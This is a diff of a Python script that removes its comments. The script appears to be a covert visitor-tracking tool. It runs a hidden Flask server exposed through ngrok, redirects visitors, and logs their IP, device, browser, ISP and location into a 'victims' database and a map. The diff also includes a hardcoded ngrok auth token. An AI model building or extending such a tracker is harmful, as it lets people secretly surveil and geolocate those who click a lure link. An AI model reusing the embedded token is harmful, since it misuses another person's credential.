@@ -19,17 +19,16 @@ import traceback
 console = Console()
 app = Flask(__name__)
 
-# Suppress all Flask/Werkzeug logging
+
 log = logging.getLogger('werkzeug')
 log.disabled = True
 app.logger.disabled = True
 
-# Ngrok Configuration
 NGROK_PATH = r"C:\Users\Gonzalo\Desktop\Python 2024\reaver\ngrok.exe"
 NGROK_API = "http://127.0.0.1:4040/api/tunnels"
 NGROK_AUTH_TOKEN = "2vSGHGpvcx98xd7QZ3MejUn1YTU_5vYyVjiQizamfYb4cyb1W"
 
-# Global map for victims
+
 global_map = folium.Map(location=[40.7128, -74.0060], zoom_start=3)
 MAP_FILENAME = "victims_map.html"
 
@@ -51,10 +50,10 @@ def init_db():
         conn = sqlite3.connect("victims.db")
         cursor = conn.cursor()
         
-        # Check if table exists
+       
         cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims'")
         if not cursor.fetchone():
-            # Create new table with all columns
+          
             cursor.execute("""
                 CREATE TABLE victims (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -72,7 +71,7 @@ def init_db():
                 )
             """)
         else:
-            # Check and add missing columns
+            
             cursor.execute("PRAGMA table_info(victims)")
             columns = [column[1] for column in cursor.fetchall()]
             if 'country' not in columns:
@@ -158,25 +157,25 @@ def update_geo_map(ip, city, region, lat, lon):
 def start_ngrok():
     """Starts ngrok tunnel with proper error handling"""
     try:
-        # Verify ngrok exists
+       
         if not os.path.exists(NGROK_PATH):
             console.print("[bold red][!] Error: ngrok.exe not found at specified path[/bold red]")
             console.print(f"[purple]Please verify the file exists at: {NGROK_PATH}[/purple]")
             return None
 
-        # Kill existing ngrok processes
+        
         subprocess.run(["taskkill", "/f", "/im", "ngrok.exe"], 
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       shell=True)
 
-        # Set auth token
+     
         subprocess.run([NGROK_PATH, "config", "add-authtoken", NGROK_AUTH_TOKEN],
                       stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL,
                       shell=True)
 
-        # Start ngrok with proper suppression
+     
         console.print("[bold purple][+] Starting ngrok tunnel (may take 10-20 seconds)...[/bold purple]")
         ngrok_process = subprocess.Popen(
             [NGROK_PATH, "http", "5000", "--log=stdout"],
@@ -187,7 +186,7 @@ def start_ngrok():
             text=True
         )
         
-        # Wait for tunnel with timeout
+       
         start_time = time.time()
         while time.time() - start_time < 30:  # 30 second timeout
             try:
@@ -235,11 +234,11 @@ def display_victim_table(ip, device, os, browser, city, region, country, isp, ti
 
 def run_flask():
     """Runs Flask server silently"""
-    # Remove problematic env vars
+
     os.environ.pop('WERKZEUG_SERVER_FD', None)
     os.environ.pop('WERKZEUG_RUN_MAIN', None)
     
-    # Run with suppressed output
+  
     with open(os.devnull, 'w') as f:
         app.run(
             host="0.0.0.0",
@@ -288,12 +287,12 @@ def main():
     def before_request():
         g.redirect_url = app.config['REDIRECT_URL']
     
-    # Start Flask in background
+    
     flask_thread = Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    time.sleep(2)  # Allow Flask to start
+    time.sleep(2)  
     
-    # Start ngrok
+    
     public_url = start_ngrok()
     
     if public_url:
